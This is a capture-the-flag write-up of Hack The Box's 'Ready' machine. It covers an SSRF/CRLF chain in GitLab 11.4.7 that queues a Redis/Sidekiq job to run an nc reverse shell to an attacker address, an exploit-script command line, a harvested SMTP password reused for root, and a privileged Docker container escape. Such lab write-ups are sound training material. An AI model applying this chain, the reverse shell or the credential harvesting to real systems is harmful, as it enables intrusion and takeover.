# Ready

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Medium |
| **IP Address** | 10.10.10.220 |
| **Status** | Retired |

## Overview
Ready is a Medium Linux machine running a self-hosted GitLab instance (version 11.4.7) inside a Docker container, exposed on port 5080. This version is vulnerable to a combined SSRF + CRLF injection chain (**CVE-2018-19571** and **CVE-2018-19585**) that abuses GitLab's project-import feature to reach an internal Redis instance and queue a malicious background job, resulting in remote code execution. A backed-up GitLab configuration file with weak permissions then exposes a reusable password that unlocks the root account, and the box is finished off by escaping a privileged Docker container.

## Reconnaissance
Nmap showed SSH and a GitLab instance on a non-standard HTTP port:

```
22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu
5080/tcp open  http  nginx
| http-title: Sign in - GitLab
| /users/sign_in
```

`robots.txt` confirmed a standard GitLab install (`/dashboard`, `/groups`, `/snippets`, `/api`, etc.), and no TLS was in use.

## Enumeration
Valid low-privilege GitLab credentials were obtained (`shorida:shorida@nice.rice:lol123456` per notes) allowing authenticated access to the GitLab web UI. With authenticated access to project creation, GitLab 11.4.7 is known to be vulnerable to an SSRF/CRLF chain in the "import project by URL" feature, allowing a crafted Redis protocol payload to be smuggled through the import URL and queued as a Sidekiq job.

## Foothold
The exploit (`GitLabRCE.py`, kept in the repository) automates this chain end-to-end:
1. Logs into GitLab with valid credentials and grabs a CSRF token.
2. Creates a new project whose "import URL" is crafted to look like a Redis URL (`git://[::ffff:127.0.0.1]:6379/...`) embedding a raw Redis `MULTI`/`LPUSH`/`EXEC` command sequence.
3. The injected Redis command enqueues a `GitlabShellWorker` Sidekiq job that calls `class_eval` on an `open("|<command>").read` payload, executing an arbitrary shell command (here, a `nc`-based reverse shell) when Sidekiq processes the queue.

```
python3 GitLabRCE.py -u shorida -p '<password>' -g http://10.10.10.220 -l <attacker_ip> -P <port>
```

This provided command execution inside the GitLab Docker container.

## Privilege Escalation
Inside the container, `/opt/backup/gitlab.rb` (a backed-up GitLab configuration file) was world-readable and contained an SMTP password:

```
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

This password was reused for the host's `root` account, allowing a full login as root inside the container. Because the GitLab container was running in **privileged mode**, it was possible to escape to the underlying host by mounting the host's block device from within the container (technique documented in ["Escaping Docker Privileged Containers"](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1)), and modify `/root/root.txt` directly on the host filesystem to confirm root-level access on the real target.

## Lessons Learned
- Outdated self-hosted GitLab instances remain a high-value target; the SSRF+CRLF-to-RCE chain (CVE-2018-19571/CVE-2018-19585) is a well-documented, powerful primitive.
- Backup/configuration files should never be left world-readable, especially when they embed service credentials.
- Password reuse between application-level secrets (SMTP) and OS accounts is a critical anti-pattern.
- Privileged Docker containers effectively grant host-level access if compromised; `--privileged` should be avoided unless strictly necessary.

## Tools & References
- `GitLabRCE.py` (kept in repository): GitLab 11.4.7 RCE PoC (CVE-2018-19571 + CVE-2018-19585), originally by Mohin Paramasivam, modified by Norbert Hofmann/Sam Redmond/Tam Lai Yin.
- [Escaping Docker Privileged Containers](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1)
- Omitted from repository for hygiene:
  - `id_rsa` / `id_rsa.pub`: an attacker-generated SSH keypair used for persistence (appended to `authorized_keys`); omitted as private key material, not part of the target's own loot.
